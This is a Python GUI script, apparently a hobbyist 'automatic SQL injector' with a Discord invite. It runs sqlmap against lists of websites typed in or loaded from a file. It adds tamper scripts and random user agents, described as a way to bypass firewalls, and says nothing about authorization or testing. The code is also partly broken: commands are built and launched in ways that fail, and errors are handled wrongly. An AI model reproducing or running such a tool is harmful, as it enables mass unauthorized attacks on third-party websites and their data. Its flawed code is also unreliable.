# Libraries
from customtkinter import *
import subprocess
import platform

#Size The Window
app= CTk()
app.geometry("850x600")

# Check The OS 
if platform.system() != "Linux":
    problemOs= CTkLabel(master=app,text="This Tool Only Works At Linux Based Operating Systems.",font=("Arial",15))
    problemOs.pack()

if platform.system() == "Linux": 

    #Main Code
    website_list=[]
    empty1= CTkLabel(master=app,text="").pack()
    MadeBy= CTkLabel(master=app,text="Otomatic Sql Injector - Made By c0de",font=("Arial", 25), text_color="#00bfff" ).pack()
    addDiscord= CTkLabel(master=app,text="discord.gg/israiltv",font=("Arial",20),text_color="#66ff33").pack()
    entryWebsite= CTkEntry(master=app,width=300,corner_radius=32)
    entryWebsite.pack()
    def addWebsite():
        website_list.append(entryWebsite.get())
    aWebsite= CTkButton(master=app,text="Add Website To the Website List",font=("Arial",15),fg_color="#00bfff",command= addWebsite,corner_radius=32).pack()
    def writeWebsite():
        for i in website_list:
            nameWebsite= CTkLabel(master=app,text=i,font=("Arial",15),text_color="#3333ff")
            nameWebsite.pack()
    wWebsite= CTkButton(master=app,text="Write Website List",font=("Arial",15),fg_color="#00bfff",command=writeWebsite,corner_radius=32).pack()
    def startInject():
        for i in website_list:
            try:
                command= "sqlmap" + " " + i + " " + "--random-agent"
                subprocess.run(command)
            except subprocess.CalledProcessError as e:
                Mistake= CTkLabel(master=app,text=f"An Error Just Happaned Check If Sqlmap Is Installed. Error code is: {e}")
                Mistake.pack()
    startSql= CTkButton(master=app,text="Start Injection",font=("Arial",15),fg_color="#00bfff",command= startInject,corner_radius=32).pack()
    empty= CTkLabel(master=app,text="").pack()
    infoText= CTkLabel(master=app,text="Sql Injection Based On A Text File",font=("Arial",20),text_color="#9933ff").pack()
    info2Text= CTkLabel(master=app,text="Write The Name of The Text File (Write The File Extension Too) Which Contains Websites You Want to Inject",font=("Arial",15)).pack()
    entryText= CTkEntry(master=app,width=300,corner_radius=32)
    entryText.pack()
    def injectText():
        with open(entryText.get() , "r") as file:
            for line in file:
                line= line.strip()
                website_list.append(line)
        for i in website_list:
            try:
                command= "sqlmap" + " " + i + " " + "--random-agent"
                subprocess.run(command)
            except subprocess.CalledProcessError as e:
                Mistake= CTkLabel(master=app,text=f"An Error Just Happaned Check If Sqlmap Is Installed. Error code is: {e}")
                Mistake.pack()
    startText= CTkButton(master=app,text="Start Injection With Txt File",font=("Arial",15),fg_color="#00bfff",command=injectText,corner_radius=32).pack()
    def writeText():
        with open(entryText.get(),"r") as file:
            for line in file:
                line = line.strip()
                website_list.append(line)
    for i in website_list:
        wwebsite= CTkLabel(master=app,text= i, font= ("Arial",15),text_color="#3333ff").pack()
    checkText= CTkButton(master=app,text="Write Websites",font=("Arial",15),fg_color="#00bfff",command=writeText,corner_radius=32).pack()
    empty2= CTkLabel(master=app,text="").pack()
    tamperInject= CTkLabel(master=app,text="Sql Injection With Sqlmap Tampers (Bypasses The Firewall But More Slow)",font=("Arilal",20), text_color="#9933ff").pack()
    infoSingleTamperWebsite= CTkLabel(master=app,text="Write The Website You Want To Inject",font=("Arial",15)).pack()
    entrySingleTamperWebsite= CTkEntry(master=app,corner_radius=32,width=300)
    entrySingleTamperWebsite.pack()
    infoSingleTamper= CTkLabel(master=app,text="Write The Tamper Name (Write The Name Between Commas) You Want To Use (You Can See Them At /.../sqlmap/tamper)",font=("Arial",15)).pack()
    entrySingleTamper= CTkEntry(master=app,corner_radius=32, width=300)
    entrySingleTamper.pack()
    def InjectSingleTamper():
        command= "sqlmap" + " " + entrySingleTamperWebsite.get() + " " + " --random-agent --tamper " + " " + entrySingleTamper.get()
        subprocess.run(command)
    buttonSingleTamper= CTkButton(master=app,text="Start The Injection To  The Single Website With Single Tamper",font=("Arial",15),fg_color="#00bfff",command=InjectSingleTamper,corner_radius=32).pack()
app.mainloop()
